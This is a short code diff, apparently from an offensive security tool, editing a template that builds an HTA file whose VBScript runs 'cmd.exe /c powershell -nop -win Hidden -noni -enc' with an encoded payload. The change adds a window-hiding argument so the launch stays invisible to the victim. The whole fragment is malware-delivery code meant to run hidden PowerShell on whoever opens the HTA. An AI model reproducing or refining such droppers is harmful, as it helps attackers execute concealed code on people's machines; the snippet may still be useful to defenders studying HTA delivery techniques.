@@ -339,7 +339,7 @@ htaTEMPLATE = %{<html>
 <head> 
 <script language="VBScript"> 
     Set objShell = CreateObject("Wscript.Shell")
-    objShell.Run "cmd.exe /c powershell -nop -win Hidden -noni -enc #{powershell_encoded}"
+    objShell.Run "cmd.exe /c powershell -nop -win Hidden -noni -enc #{powershell_encoded}", 0
 </script> 
 </head> 
 <body> 
